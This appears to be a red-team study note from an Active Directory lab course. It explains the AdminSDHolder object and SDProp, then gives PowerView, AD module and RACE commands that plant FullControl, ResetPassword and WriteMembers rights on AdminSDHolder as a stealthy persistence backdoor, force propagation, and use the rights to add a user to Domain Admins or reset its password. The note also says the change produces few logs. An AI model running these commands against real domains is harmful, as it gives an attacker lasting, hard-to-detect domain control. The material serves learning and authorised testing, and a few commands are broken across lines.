**Essentially an ACL baseline that overwrites any changes made to protected groups**

Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups)

Security Descriptor Propagator (`SDPROP`) runs every hour and compares the ACL of protected groups and members with the ACL of `AdminSDHolder` and any differences are overwritten on the object ACL

Protected Groups:

| Account Operators | Enterprise Admins            |
| ----------------- | ---------------------------- |
| Backup Operators  | Domain Controllers           |
| Server Operators  | Read-only Domain Controllers |
| Print Operators   | Schema Admins                |
| Domain Admins     | Administrators               |
| Replicator        |                              |

Well known abuse of some of the Protected Groups - All of the below
can log on locally to DC:

| Group             | Abuse                                                                                |
| ----------------- | ------------------------------------------------------------------------------------ |
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.          |
| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators  | Run a command as system (using the disabled Browser service)                         |
| Print Operators   | Copy ntds.dit backup, load device drivers                                            |

With DA privileges (Full Control/Write permissions) on the
`AdminSDHolder` object, it can be used as a backdoor/persistence
mechanism by adding a user with Full Permissions (or other interesting
permissions) to the `AdminSDHolder` object

In 60 minutes (when `SDPROP` runs), the user will be added with Full
Control to the AC of groups like Domain Admins without actually being a
member of it


> [!NOTE] **NOTE**
> Adding a new object to the `AdminSDHolder` won't generate any new logs for `WreiteDACL`. The only way to get insights of abuse is by turning logging on group within the Advanced Security Settings

###### **Adding permissions to `AdminSDHolder`**

Add `FullControl` permissions for a user to the `AdminSDHolder` using PowerView as DA
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Using `ActiveDirectory` Module and [RACE](https://github.com/samratashok/RACE) toolkit:
```powershell
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```

`ResetPassword` and `WriteMembers` permissions to `AdminSDHolder` and PowerView.
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

--- 
##### **After adding permissions to `AdminSDHolder`, `SDProp` must be ran/updated for the changes to take effect**

Manually run `SDProp`
```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -
Verbose
```

For pre-Server 2008 machines
```powershell
Invoke-SDPropagator -taskname FixUpInheritance -
timeoutMinutes 1 -showProgress -Verbose
```

--- 
##### **Confirm permissions as a standard user**

PoweView
```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
```

ActiveDirectory Module
```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'
```
---
##### Abusing Permissions

Abusing `FullControl` with PowerView and AD module
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

Add-ADGroupMember -Identity 'Domain Admins' -Members
testda
```


Abusing `ResetPassword` with PowerView and AD module
```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
```